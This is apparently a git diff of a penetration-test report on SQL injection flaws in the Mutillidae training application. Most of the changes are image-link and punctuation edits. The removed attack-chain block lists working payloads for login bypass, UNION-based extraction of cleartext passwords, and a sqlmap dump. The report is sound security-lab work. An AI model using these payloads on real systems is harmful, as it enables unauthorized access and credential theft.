@@ -116,7 +116,7 @@ at each step to support the findings in this report.
 Critical
 
 #### Affected Endpoint
-`/mutillidae/index.php?page=login.php` — POST, `username` field
+`/mutillidae/index.php?page=login.php` (POST), `username` field
 
 #### Description
 The login form passes the `username` field directly into a SQL `SELECT` query
@@ -133,7 +133,7 @@ attack surface:
 
 
 
-![Mutillidae Login Page - Username and Password Fields](image.jpg)
+![Mutillidae Login Page - Username and Password Fields](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_01%20Mutillidae%20Login%20Page%20-%20Username%20and%20Password%20Fields.jpg)
 
 
 
@@ -146,7 +146,7 @@ Application returned an error exposing query structure:
 
 
 
-![Login Error Response Revealing SQL Query Structure](image.jpg)
+![Login Error Response Revealing SQL Query Structure](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_02%20Login%20Error%20Response%20Revealing%20SQL%20Query%20Structure.jpg)
 
 
 
@@ -159,7 +159,7 @@ Application response confirming login as `Admin: admin (g0t r00t?)`:
 
 
 
-![Successful Admin Login via SQL Injection Payload](image.jpg)
+![Successful Admin Login via SQL Injection Payload](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_03%20Successful%20Admin%20Login%20via%20SQL%20Injection%20Payload.jpg)
 
 
 
@@ -196,7 +196,7 @@ $stmt->execute([$username, $password]);
 Critical
 
 #### Affected Endpoint
-`/mutillidae/index.php?page=user-info.php` — GET, `username` parameter
+`/mutillidae/index.php?page=user-info.php` (GET), `username` parameter
 
 #### Description
 The User Lookup page passes the `username` GET parameter directly into a SQL
@@ -225,7 +225,7 @@ Application response confirming columns 2, 3, and 4 are rendered on screen:
 
 
 
-![UNION SELECT Numeric Payload - Visible Columns 2, 3, 4 Confirmed](image.jpg)
+![UNION SELECT Numeric Payload - Visible Columns 2, 3, 4 Confirmed](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_04%20UNION%20SELECT%20Numeric%20Payload%20-%20Visible%20Columns%202%2C%203%2C%204%20Confirmed.jpg)
 
 
 
@@ -243,7 +243,7 @@ Signature = nowasp
 
 
 
-![UNION SELECT - version(), user(), database() Output](image.jpg)
+![UNION SELECT - version(), user(), database() Output](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_05%20UNION%20SELECT%20-%20version()%2C%20user()%2C%20database()%20Output.jpg)
 
 
 
@@ -255,7 +255,7 @@ All usernames and cleartext passwords extracted from the accounts table:
 
 
 
-![UNION SELECT - Full Accounts Table Dump Including Cleartext Passwords](image.jpg)
+![UNION SELECT - Full Accounts Table Dump Including Cleartext Passwords](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_06%20UNION%20SELECT%20-%20Full%20Accounts%20Table%20Dump%20Including%20Cleartext%20Passwords.jpg)
 
 
 
@@ -280,7 +280,7 @@ to any account on the platform.
   described in Finding 01
 - Apply column-level output encoding so user-controlled data cannot be
   rendered as raw values in the response
-- Enforce a strict allowlist on the `username` parameter — reject any input
+- Enforce a strict allowlist on the `username` parameter, reject any input
   containing SQL metacharacters including single quotes, spaces, UNION,
   SELECT, and comment sequences
 
@@ -292,7 +292,7 @@ to any account on the platform.
 Critical
 
 #### Affected Endpoint
-`/mutillidae/index.php?page=user-info.php` — GET, `username` parameter
+`/mutillidae/index.php?page=user-info.php` (GET), `username` parameter
 
 #### Description
 The application returns verbose MySQL XPATH error messages that embed the
@@ -340,7 +340,7 @@ XPATH syntax error: '~accounts'
 
 
 
-![Error-Based Injection - ExtractValue Payloads and Error Responses](image.jpg)
+![Error-Based Injection - ExtractValue Payloads and Error Responses](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_07%20Error-Based%20Injection%20-%20ExtractValue%20Payloads%20and%20Error%20Responses.jpg)
 
 
 
@@ -390,7 +390,7 @@ would work even if the output rendering observed in Finding 02 were removed.
 Critical
 
 #### Affected Endpoint
-`/mutillidae/index.php?page=login.php` — POST, `username` field
+`/mutillidae/index.php?page=login.php` (POST), `username` field
 
 #### Description
 The login query evaluates both a username match and a boolean condition in the
@@ -423,7 +423,7 @@ Application response confirming successful admin login via boolean bypass:
 
 
 
-![Boolean-Based Bypass - Successful Admin Login Confirmation](image.jpg)
+![Boolean-Based Bypass - Successful Admin Login Confirmation](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_08%20Boolean-Based%20Bypass%20-%20Successful%20Admin%20Login%20Confirmation.jpg)
 
 
 
@@ -434,7 +434,7 @@ evaluates to true, so the query returns the admin record unconditionally.
 Boolean-based injection provides authentication bypass using any confirmed
 valid username. In combination with the user enumeration possible via
 Finding 02 and Finding 03, an attacker can bypass login for any account on
-the platform — not just admin. This gives targeted access to specific user
+the platform, not just admin. This gives targeted access to specific user
 accounts rather than only the first account returned by a generic OR payload.
 
 #### Remediation
@@ -476,7 +476,7 @@ Accounts table dump showing all 24 records with plaintext passwords:
 
 
 
-![SQLMap Accounts Table Dump - Cleartext Passwords Visible](image.jpg)
+![SQLMap Accounts Table Dump - Cleartext Passwords Visible](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_09%20SQLMap%20Accounts%20Table%20Dump%20-%20Cleartext%20Passwords%20Visible.jpg)
 
 
 
@@ -493,7 +493,7 @@ SQLMap automated password hash cracking output for database-level accounts:
 
 
 
-![SQLMap Password Hash Cracking - Multiple Accounts Cracked](image.jpg)
+![SQLMap Password Hash Cracking - Multiple Accounts Cracked](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_10%20SQLMap%20Password%20Hash%20Cracking%20-%20Multiple%20Accounts%20Cracked.jpg)
 
 
 
@@ -551,7 +551,7 @@ ExtractValue(1, CONCAT(0x7e, database())) #' AND password='' (0)
 
 
 
-![Verbose MySQL Error Exposing File Path, Query, and Extracted Data](image.jpg)
+![Verbose MySQL Error Exposing File Path, Query, and Extracted Data](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_11%20Verbose%20MySQL%20Error%20Exposing%20File%20Path%2C%20Query%2C%20and%20Extracted%20Data.jpg)
 
 
 
@@ -572,44 +572,7 @@ browser response.
 
 ## 7. Attack Chain
 
-```
-[Step 1] Attack Surface Identification
-Login page (POST) and User Lookup page (GET) identified
-→ Both pass user input directly to MySQL without sanitization
-        ↓
-[Step 2] Authentication Bypass - Login Page
-Payload: ' OR '1'='1' #
-→ Admin account returned as first database record
-→ Full application access granted without valid credentials
-
-Alternative: admin' AND 1=1 #
-→ Targeted account bypass using known username
-        ↓
-[Step 3] Column Count Determination - User Lookup Page
-Payload: ' ORDER BY 7 # (success) / ' ORDER BY 8 # (error)
-→ Backend query confirmed as 7 columns
-        ↓
-[Step 4] Visible Column Identification
-Payload: ' UNION SELECT 1, 2, 3, 4, 5, 6, 7 #
-→ Columns 2, 3, 4 confirmed as rendered in browser output
-        ↓
-[Step 5] Database Metadata Extraction
-Payload: ' UNION SELECT 1, version(), user(), database(), 5, 6, 7 #
-→ MySQL 5.1.41 / mutillidae@localhost / nowasp
-        ↓
-[Step 6] Full Credential Dump
-Payload: ' UNION SELECT 1, username, password, 4, 5, 6, 7 FROM accounts #
-→ 25 records returned including all usernames and cleartext passwords
-        ↓
-[Step 7] Automated Confirmation via SQLMap
-sqlmap against userinfo.php GET parameters
-→ 2 injection points confirmed automatically
-→ 34 databases enumerated
-→ All nowasp tables listed (12 tables)
-→ accounts table dumped: 24 records with cleartext and cracked passwords
-→ Column structure confirmed: cid, firstname, is_admin, lastname,
-  mysignature, password, username
-```
+![Attack Chain](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_11%20Attack%20Chain.png)
 
 ---
 
